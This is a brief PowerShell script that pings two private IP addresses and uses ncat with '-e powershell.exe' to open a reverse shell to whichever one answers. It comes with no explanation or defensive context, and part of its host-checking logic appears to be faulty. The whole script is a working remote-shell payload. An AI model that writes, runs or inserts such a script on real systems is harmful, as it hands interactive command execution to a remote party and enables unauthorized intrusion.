$pingA = ping 10.0.0.223 -n 1; ( $pingA | Select-Object Lost); $pingA = $pingA.Lost
$pingB = ping 10.145.168.181 -n 1

If($null -ne $pingA)
{
    Write-Host "Connecting to 10.0.0.223"
    .\ncat 10.0.0.223 -e powershell.exe
}
ElseIf($null -ne $pingB)
{
    Write-Host "Connecting to 10.145.168.181"
    .\ncat 10.145.168.181 -e powershell.exe
}